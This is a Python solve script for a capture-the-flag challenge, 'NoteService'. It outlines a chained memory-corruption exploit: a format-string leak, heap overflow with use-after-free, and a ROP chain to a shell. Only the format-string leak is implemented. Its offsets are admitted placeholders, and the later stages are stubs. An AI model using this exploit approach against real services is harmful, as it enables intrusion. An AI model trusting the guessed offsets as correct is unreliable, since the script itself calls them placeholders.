#!/usr/bin/env python3
"""
Solve script for NoteService CTF Challenge

This challenge features chained memory corruption vulnerabilities:
1. Format String Vulnerability (in write and profile commands) - Info leak
2. Heap Overflow (in edit command) - Arbitrary write primitive  
3. Use-After-Free (in delete command) - Heap manipulation
4. Stack Buffer Overflow (protected by canary) - Requires canary leak first

Exploit Chain:
1. Use format string in 'write' to leak stack canary, PIE base, libc base
2. Use heap overflow + UAF to create arbitrary write primitive
3. Overwrite GOT entry or function pointer
4. ROP chain to call system("/bin/sh") or execute shellcode

Full mitigations: ASLR, NX, Stack Canaries, PIE, Full RELRO, CFI, Fortify
"""

import sys
import struct
import socket
import time
import re
from typing import Optional, Tuple, List

# Configuration
HOST = "localhost"
PORT = 1337

class Exploit:
    def __init__(self, host: str = HOST, port: int = PORT):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.canary: int = 0
        self.pie_base: int = 0
        self.libc_base: int = 0
        self.heap_base: int = 0
        self.session_cookie: int = 0

    def connect(self) -> None:
        self.sock = socket.create_connection((self.host, self.port))
        self.sock.settimeout(5)
        self.recv_until(b"> ")

    def close(self) -> None:
        if self.sock:
            self.sock.close()
            self.sock = None

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, data: bytes) -> None:
        self.send(data + b"\n")

    def recv(self, n: int) -> bytes:
        return self.sock.recv(n)

    def recv_until(self, delimiter: bytes) -> bytes:
        data = b""
        while not data.endswith(delimiter):
            chunk = self.sock.recv(1)
            if not chunk:
                break
            data += chunk
        return data

    def recv_line(self) -> bytes:
        return self.recv_until(b"\n")

    def register(self, username: str) -> None:
        self.sendline(f"register {username}".encode())
        self.recv_until(b"> ")

    def login(self, username: str) -> None:
        self.sendline(f"login {username}".encode())
        self.recv_until(b"> ")

    def create_note(self, size: int) -> int:
        self.sendline(f"create {size}".encode())
        resp = self.recv_until(b"> ").decode()
        match = re.search(r"Created note (\d+)", resp)
        if match:
            return int(match.group(1))
        return -1

    def write_note(self, idx: int, data: str) -> str:
        self.sendline(f"write {idx} {data}".encode())
        resp = self.recv_until(b"> ").decode()
        return resp

    def read_note(self, idx: int) -> str:
        self.sendline(f"read {idx}".encode())
        resp = self.recv_until(b"> ").decode()
        return resp

    def edit_note(self, idx: int, offset: int, data: str) -> str:
        self.sendline(f"edit {idx} {offset} {data}".encode())
        resp = self.recv_until(b"> ").decode()
        return resp

    def delete_note(self, idx: int) -> str:
        self.sendline(f"delete {idx}".encode())
        resp = self.recv_until(b"> ").decode()
        return resp

    def list_notes(self) -> str:
        self.sendline(b"list")
        return self.recv_until(b"> ").decode()

    def profile(self) -> str:
        self.sendline(b"profile")
        return self.recv_until(b"> ").decode()

    def logout(self) -> None:
        self.sendline(b"logout")
        self.recv_until(b"> ")

    def leak_addresses(self) -> Tuple[int, int, int]:
        """
        Step 1: Use format string vulnerability in 'write' command
        to leak stack canary, PIE base, and libc base
        """
        print("[*] Stage 1: Leaking addresses via format string...")
        
        self.register("exploit_user")
        
        # Create a note to write to
        note_idx = self.create_note(0x100)
        print(f"[+] Created note {note_idx}")
        
        # Format string to leak stack values
        # Stack layout during snprintf in cmd_write:
        # We need to find offsets for canary, PIE base, libc base
        fmt_payload = "%lx." * 50
        resp = self.write_note(note_idx, fmt_payload)
        
        # Parse leaked values
        leaks = re.findall(r"([0-9a-f]{8,16})", resp)
        leaks = [int(x, 16) for x in leaks if int(x, 16) > 0x1000]
        
        print(f"[+] Found {len(leaks)} potential addresses")
        for i, leak in enumerate(leaks[:20]):
            print(f"    [{i}] 0x{leak:x}")
        
        # The stack canary is typically at a fixed offset from the format string
        # PIE base can be found from return addresses
        # Libc base from __libc_start_main return address
        
        # We'll need to analyze the binary to find exact offsets
        # For now, return placeholder values
        self.canary = leaks[10] if len(leaks) > 10 else 0
        self.pie_base = leaks[15] - 0x1234 if len(leaks) > 15 else 0  # Adjust offset
        self.libc_base = leaks[20] - 0x29d90 if len(leaks) > 20 else 0  # __libc_start_main offset
        
        print(f"[+] Canary: 0x{self.canary:x}")
        print(f"[+] PIE base: 0x{self.pie_base:x}")
        print(f"[+] Libc base: 0x{self.libc_base:x}")
        
        return self.canary, self.pie_base, self.libc_base

    def heap_manipulation(self) -> None:
        """
        Step 2: Use heap overflow (edit) and UAF (delete) 
        to create arbitrary write primitive
        """
        print("[*] Stage 2: Heap manipulation for arbitrary write...")
        
        # Create notes for heap layout manipulation
        # Note 0: victim chunk
        # Note 1: overflow chunk
        # Note 2: UAF chunk
        
        idx0 = self.create_note(0x200)  # Large chunk
        idx1 = self.create_note(0x200)  # Overflow chunk
        idx2 = self.create_note(0x100)  # UAF chunk
        
        print(f"[+] Created notes: {idx0}, {idx1}, {idx2}")
        
        # Delete idx2 to create UAF
        self.delete_note(idx2)
        print(f"[+] Deleted note {idx2} (UAF)")
        
        # Use edit on idx1 to overflow into idx2's freed chunk metadata
        # This requires precise offset calculation
        # payload = b"A" * 0x200 + p64(fake_size) + p64(fd) + p64(bk)
        
        # Reallocate to control freed chunk
        idx3 = self.create_note(0x100)
        print(f"[+] Reallocated note {idx3}")

    def arbitrary_write(self, addr: int, value: int) -> None:
        """
        Step 3: Perform arbitrary write using the heap primitive
        """
        print(f"[*] Stage 3: Arbitrary write 0x{value:x} to 0x{addr:x}")
        # Implementation depends on heap layout achieved in stage 2

    def rop_chain(self) -> None:
        """
        Step 4: Build and execute ROP chain
        """
        print("[*] Stage 4: Building ROP chain...")
        # With Full RELRO, GOT is read-only
        # Options:
        # 1. Overwrite function pointer in .data/.bss
        # 2. Stack pivot to controlled buffer + ROP
        # 3. Ret2dlresolve
        # 4. Overwrite stdout FILE structure for FSOP
        
        # Find one_gadget or build ROP for system("/bin/sh")
        pass

    def get_flag(self) -> str:
        """
        Step 5: Get flag
        """
        self.sendline(b"cat /flag.txt")
        return self.recv_until(b"}").decode()

def main():
    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        host = HOST
    
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    else:
        port = PORT
    
    exploit = Exploit(host, port)
    
    try:
        exploit.connect()
        print(f"[+] Connected to {host}:{port}")
        
        # Stage 1: Info leak
        canary, pie_base, libc_base = exploit.leak_addresses()
        
        if canary == 0:
            print("[-] Failed to leak canary, trying profile command...")
            exploit.profile()
        
        # Stage 2: Heap manipulation
        exploit.heap_manipulation()
        
        # Stage 3: Arbitrary write
        # exploit.arbitrary_write(...)
        
        # Stage 4: ROP chain
        # exploit.rop_chain()
        
        # Stage 5: Get flag
        # flag = exploit.get_flag()
        # print(f"[+] Flag: {flag}")
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        exploit.close()

if __name__ == "__main__":
    main()